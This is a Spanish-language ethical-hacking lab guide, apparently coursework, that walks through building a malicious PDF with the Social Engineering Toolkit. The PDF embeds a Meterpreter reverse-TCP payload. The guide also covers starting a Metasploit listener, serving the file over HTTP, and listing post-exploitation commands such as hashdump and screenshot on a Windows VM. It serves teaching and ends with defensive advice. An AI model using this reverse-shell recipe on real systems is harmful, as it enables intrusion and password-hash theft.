# 🔒 PDF Malicioso con SET

> **⚠️ Solo para uso académico en laboratorio controlado**
> Este ejercicio se realiza únicamente en máquinas virtuales aisladas del ITLA. Replicar este proceso fuera del laboratorio autorizado constituye un delito tipificado en la Ley 53-07 de Crímenes y Delitos de Alta Tecnología de la República Dominicana.

**Guía completa del ejercicio de Ingeniería Social usando Social Engineering Toolkit y Metasploit Framework**

- **Asignatura:** Hacker Ético I · ITLA
- **Herramientas:** SET + Metasploit
- **Entorno:** VMware Workstation
- **Fecha:** Octubre 2026

---

## 01 — Entorno: Configuración del Laboratorio

El laboratorio utiliza dos máquinas virtuales corriendo en VMware Workstation, sin conectividad hacia fuera de la red interna.

| Rol | Sistema Operativo | IP | Función |
| :--- | :--- | :--- | :--- |
| **Atacante (Kali HE1)** | Kali Linux | `192.168.254.147` | Genera el payload y escucha la conexión |
| **Víctima** | Windows Server 2022 | `192.168.254.148` | Abre el PDF malicioso |

> **💡 ¿Qué es un Reverse TCP Shell?**
> En vez de que el atacante se conecte a la víctima (lo que bloquearía un firewall), el payload hace que la **víctima se conecte de vuelta al atacante**. Por eso el `LHOST` siempre es la IP de Kali: es quien escucha.

**Flujo de conexión:**
`Windows (víctima)` → `Abre el PDF` → `Ejecuta form.exe` → `192.168.254.147:4444` → `Sesión Meterpreter ✓`

---

## 02 — Reconocimiento: Verificar Puertos

Antes de configurar el listener, se verifica que el puerto no esté en uso.

```bash
kali@Kali:~$ ss -tlnp
State   Recv-Q  Send-Q  Local Address:Port  Peer Address:Port
LISTEN  0       128     0.0.0.0:22         0.0.0.0:*
LISTEN  0       128     [::]:22            [::]:*

# Solo el puerto 22 (SSH) está ocupado → el 4444 está libre ✓
```

> **Nota:** El puerto `4444` es el predeterminado de Metasploit y funciona en un lab cerrado. En pentesting real se prefieren puertos como 443 u 80 para evadir firewalls.

---

## 03 — Generación del Payload: Social Engineering Toolkit

Se inicia SET como root:
```bash
sudo su
setoolkit
```

### Navegación por los menús de SET

1. **Menú principal → Social-Engineering Attacks:** Elegir la opción `1`.
2. **Infectious Media Generator:** Elegir la opción `3` (genera archivos que se ejecutan automáticamente).
3. **File-Format Exploits:** Elegir la opción `2`.
4. **Seleccionar el exploit (Opción 13):** Se elige `13 — Adobe PDF Embedded EXE Social Engineering`. Este método embebe directamente un ejecutable dentro del PDF.
5. **PDF base:** Elegir la opción `2` (Use built-in BLANK PDF for attack).
6. **Tipo de payload:** Elegir la opción `2` (Windows Meterpreter Reverse_TCP). Meterpreter ofrece capacidades de post-explotación avanzadas.
7. **LHOST (IP del listener):** Se ingresa la IP de Kali (`192.168.254.147`).
8. **LPORT (Puerto de escucha):** Se utiliza el puerto `4444`.
9. **Finalización:** SET confirma la creación del PDF en la carpeta `/root/.set/`. Se responde `no` a la creación automática del listener, ya que se levantará manualmente.

---

## 04 — Escucha: Configurar el Listener en Metasploit

En una segunda terminal, se lanza Metasploit pasando los parámetros en un solo comando para agilizar el proceso:

```bash
root@Kali:~# msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.254.147; set LPORT 4444; set ExitOnSession false; exploit -j"

[*] Exploit running as background job 0.
[*] Started reverse TCP handler on 192.168.254.147:4444
msf6 exploit(multi/handler) > _
```

---

## 05 — Entrega: Servir el PDF mediante HTTP

En una tercera terminal, se navega a la carpeta oculta de SET y se levanta un servidor web con Python para entregar el archivo:

```bash
root@Kali:~# cd /root/.set/
root@Kali:~/.set# python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

---

## 06 — Ejecución: Entregar y Abrir el PDF

1. **Descargar el PDF:** En la VM de Windows, se accede a `http://192.168.254.147:8080/template.pdf` desde el navegador.
2. **Abrir con Adobe Reader:** El PDF se debe abrir con **Adobe Acrobat Reader** (el visor del navegador no ejecutará el payload).
3. **Guardar adjunto:** Al abrirlo, Adobe solicita guardar el archivo embebido (`form.pdf`, que en realidad es un `.exe`). Se guarda en Descargas.
4. **Renombrar y ejecutar:** Desde el CMD de Windows se corrige la extensión y se ejecuta:
   ```cmd
   C:\Users\Administrador\Downloads> ren form.pdf form.exe
   C:\Users\Administrador\Downloads> form.exe
   ```

---

## 07 — Resultado: Sesión Meterpreter Establecida

En la terminal de Metasploit en Kali, se recibe la conexión y se obtiene el control:

```bash
[*] Meterpreter session 1 opened (192.168.254.147:4444 -> 192.168.254.148:XXXX)

msf6 exploit(multi/handler) > sessions -i 1
meterpreter > sysinfo
Computer   : WIN-SERVER2022
OS         : Windows Server 2022
Architecture : x86
```

### Comandos de Post-Explotación para la Presentación
| Comando | Descripción |
| :--- | :--- |
| `sysinfo` | Información del sistema víctima |
| `getuid` | Usuario con el que corre el proceso |
| `screenshot` | Captura de pantalla del escritorio de la víctima |
| `shell` | Abre un CMD interactivo |
| `migrate <PID>` | Migrar el proceso a otro más estable |
| `hashdump` | Extraer hashes de contraseñas (requiere SYSTEM) |

---

## 08 — Conceptos Clave

- **Ingeniería Social:** El ataque no explota una vulnerabilidad técnica del SO, sino la confianza del usuario. El PDF es un "señuelo" (pretexting).
- **Vector vs. Payload:** El vector es el PDF (medio de entrega). El payload es el ejecutable Meterpreter.
- **Limitaciones Modernas:** Versiones modernas de Adobe y Windows Defender bloquean esto. El lab demuestra el riesgo en entornos que carecen de *patch management*.
- **Defensa (Blue Team):** Mantener software actualizado, activar el sandbox de Adobe Reader, usar EDR/XDR y aplicar el principio de mínimo privilegio.

---

## 09 — Archivos Generados por SET

| Archivo | Ruta en Kali | Descripción |
| :--- | :--- | :--- |
| `template.pdf` | `/root/.set/template.pdf` | El PDF malicioso con el EXE embebido |
| `payload.exe` | `/root/.set/payload.exe` | El ejecutable del payload por separado |
| `autorun/` | `/root/.set/autorun/` | Carpeta lista para copiar en USB con `autorun.inf` |
| `meta_config` | `/root/.set/meta_config` | Configuración automática para Metasploit |